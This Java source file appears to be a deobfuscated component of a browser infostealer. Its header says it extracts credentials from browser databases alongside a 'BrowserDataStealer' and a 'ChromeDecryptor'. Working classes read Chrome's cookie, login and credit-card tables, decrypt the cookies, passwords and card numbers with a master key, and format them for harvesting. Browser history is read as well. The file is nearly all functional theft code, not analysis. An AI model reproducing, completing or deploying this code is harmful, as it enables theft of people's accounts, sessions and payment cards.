import java.sql.ResultSet;
import java.util.Base64;

/**
 * SQLite Database Reader
 * Obfuscated names: ե (U+0565), դ (U+0564), զ (U+0566), է (U+0567),
 *                   ը (U+0568), թ (U+0569), ժ (U+056A), ի (U+056B),
 *                   ճ (U+0573), մ (U+0574), ն (U+0576), յ (U+0575)
 *
 * A collection of SQLite database reader classes used to extract
 * credentials from browser databases.
 *
 * These classes implement the ՕInterface (U+0525) which defines
 * a single method: String ÿ(Object[]) throws Exception
 *
 * Each class handles a specific SQLite query result:
 * - ե: Reads cookie values (host_key, name, encrypted_value, path, expires_utc)
 * - դ: Reads login data (origin_url, username_value, password_value)
 * - զ: Reads credit card data (name_on_card, card_number_encrypted, expiration_month, expiration_year)
 * - է: Reads autofill data (name, value)
 * - ը: Reads history (url, title, visit_count, last_visit_time)
 * - թ: Reads downloads (current_path, target_path, total_bytes)
 * - ժ: Reads bookmarks (url, title, date_added)
 * - ի: Reads extensions (id, name, version)
 * - ճ: Reads web data (autofill entries)
 * - մ: Reads form data
 * - ն: Reads search terms
 * - յ: Main SQLite query executor
 *
 * Usage pattern:
 * 1. Open SQLite database file
 * 2. Execute SQL query
 * 3. Pass ResultSet to appropriate reader class
 * 4. Reader formats and returns data as string
 *
 * The readers work with the BrowserDataStealer and ChromeDecryptor
 * to extract and decrypt browser credentials.
 */
public class SqliteReader {

    /**
     * Interface for SQLite result processors.
     * Each implementation handles a specific table/query.
     */
    public interface ResultProcessor {
        /**
         * Processes a SQLite ResultSet row.
         *
         * @param rs ResultSet positioned at current row
         * @return Formatted string representation of the row
         * @throws Exception on processing error
         */
        String processRow(ResultSet rs) throws Exception;
    }

    // =========================================================
    // COOKIE READER
    // =========================================================

    /**
     * Reads and formats cookie data from Chrome's Cookies database.
     *
     * SQL: SELECT host_key, name, encrypted_value, path, expires_utc, is_secure
     *      FROM cookies
     *
     * Output format (Netscape cookie format):
     * host_key \t FALSE \t path \t is_secure \t expires_utc \t name \t decrypted_value
     */
    public static class CookieReader implements ResultProcessor {
        private final byte[] masterKey;

        public CookieReader(byte[] masterKey) {
            this.masterKey = masterKey;
        }

        @Override
        public String processRow(ResultSet rs) throws Exception {
            String host = rs.getString("host_key");
            String name = rs.getString("name");
            byte[] encryptedValue = rs.getBytes("encrypted_value");
            String path = rs.getString("path");
            long expiresUtc = rs.getLong("expires_utc");
            boolean isSecure = rs.getBoolean("is_secure");

            // Decrypt value
            String value = ChromeDecryptor.decryptCredential(encryptedValue, masterKey);
            if (value == null) value = "";

            // Format as Netscape cookie
            return String.format("%s\tFALSE\t%s\t%s\t%d\t%s\t%s",
                host, path, isSecure ? "TRUE" : "FALSE",
                expiresUtc, name, value);
        }
    }

    // =========================================================
    // LOGIN DATA READER
    // =========================================================

    /**
     * Reads and formats login credentials from Chrome's Login Data database.
     *
     * SQL: SELECT origin_url, username_value, password_value
     *      FROM logins
     *      WHERE blacklisted_by_user = 0
     *
     * Output format:
     * URL: https://example.com
     * Username: user@example.com
     * Password: decrypted_password
     * ---
     */
    public static class LoginDataReader implements ResultProcessor {
        private final byte[] masterKey;

        public LoginDataReader(byte[] masterKey) {
            this.masterKey = masterKey;
        }

        @Override
        public String processRow(ResultSet rs) throws Exception {
            String url = rs.getString("origin_url");
            String username = rs.getString("username_value");
            byte[] encryptedPassword = rs.getBytes("password_value");

            // Decrypt password
            String password = ChromeDecryptor.decryptCredential(encryptedPassword, masterKey);
            if (password == null) password = "[DECRYPTION FAILED]";

            return String.format("URL: %s\nUsername: %s\nPassword: %s\n---",
                url, username, password);
        }
    }

    // =========================================================
    // CREDIT CARD READER
    // =========================================================

    /**
     * Reads and formats credit card data from Chrome's Web Data database.
     *
     * SQL: SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year
     *      FROM credit_cards
     *
     * Output format:
     * Name: John Doe
     * Number: 4111111111111111
     * Expiry: 12/2025
     * ---
     */
    public static class CreditCardReader implements ResultProcessor {
        private final byte[] masterKey;

        public CreditCardReader(byte[] masterKey) {
            this.masterKey = masterKey;
        }

        @Override
        public String processRow(ResultSet rs) throws Exception {
            String name = rs.getString("name_on_card");
            byte[] encryptedNumber = rs.getBytes("card_number_encrypted");
            int expMonth = rs.getInt("expiration_month");
            int expYear = rs.getInt("expiration_year");

            // Decrypt card number
            String cardNumber = ChromeDecryptor.decryptCredential(encryptedNumber, masterKey);
            if (cardNumber == null) cardNumber = "[DECRYPTION FAILED]";

            return String.format("Name: %s\nNumber: %s\nExpiry: %02d/%d\n---",
                name, cardNumber, expMonth, expYear);
        }
    }

    // =========================================================
    // HISTORY READER
    // =========================================================

    /**
     * Reads browser history entries.
     *
     * SQL: SELECT url, title, visit_count, last_visit_time
     *      FROM urls
     *      ORDER BY visit_count DESC
     *      LIMIT 100
     */
    public static class HistoryReader implements ResultProcessor {
        @Override
        public String processRow(ResultSet rs) throws Exception {
            String url = rs.getString("url");
            String title = rs.getString("title");
            int visitCount = rs.getInt("visit_count");

            return String.format("[%d visits] %s - %s", visitCount, title, url);
        }
    }
}
